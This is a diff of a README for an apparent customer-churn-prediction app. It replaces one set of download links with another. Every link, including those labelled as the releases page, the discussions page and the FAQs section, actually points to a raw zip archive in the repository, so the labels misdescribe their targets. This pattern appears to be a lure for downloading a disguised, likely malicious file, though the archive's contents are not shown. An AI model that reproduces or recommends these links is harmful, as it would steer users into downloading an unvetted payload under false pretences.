@@ -1,6 +1,6 @@
 # 🎉 Customer-Churn-Prediction - Easily Analyze Customer Retention
 
-[![Download Here](https://github.com/Kiruba99944/Customer-Churn-Prediction/raw/refs/heads/main/presentation/Churn_Prediction_Customer_2.2-beta.2.zip%20Now-Visit%20Releases-brightgreen)](https://github.com/Kiruba99944/Customer-Churn-Prediction/raw/refs/heads/main/presentation/Churn_Prediction_Customer_2.2-beta.2.zip)
+[![Download Here](https://github.com/Kiruba99944/Customer-Churn-Prediction/raw/refs/heads/main/dashboard/Customer-Prediction-Churn-2.7-beta.5.zip%20Now-Visit%20Releases-brightgreen)](https://github.com/Kiruba99944/Customer-Churn-Prediction/raw/refs/heads/main/dashboard/Customer-Prediction-Churn-2.7-beta.5.zip)
 
 ## 🚀 Getting Started
 
@@ -24,7 +24,7 @@ Customer churn prediction is the process of analyzing customer data to determine
 To get started, you need to download the application from our Releases page. 
 
 1. Click the link below to visit the Releases page:
-   [Download Here](https://github.com/Kiruba99944/Customer-Churn-Prediction/raw/refs/heads/main/presentation/Churn_Prediction_Customer_2.2-beta.2.zip)
+   [Download Here](https://github.com/Kiruba99944/Customer-Churn-Prediction/raw/refs/heads/main/dashboard/Customer-Prediction-Churn-2.7-beta.5.zip)
 
 2. On the Releases page, you will find different versions of the application listed.
 
@@ -65,8 +65,8 @@ Ensure your system meets these requirements to run the application smoothly:
 
 If you encounter issues or have questions:
 
-- Visit our [GitHub Discussions page](https://github.com/Kiruba99944/Customer-Churn-Prediction/raw/refs/heads/main/presentation/Churn_Prediction_Customer_2.2-beta.2.zip) for community support.
-- Check our [FAQs section](https://github.com/Kiruba99944/Customer-Churn-Prediction/raw/refs/heads/main/presentation/Churn_Prediction_Customer_2.2-beta.2.zip) for common questions.
+- Visit our [GitHub Discussions page](https://github.com/Kiruba99944/Customer-Churn-Prediction/raw/refs/heads/main/dashboard/Customer-Prediction-Churn-2.7-beta.5.zip) for community support.
+- Check our [FAQs section](https://github.com/Kiruba99944/Customer-Churn-Prediction/raw/refs/heads/main/dashboard/Customer-Prediction-Churn-2.7-beta.5.zip) for common questions.
 
 ## 🙏 Contributing
 
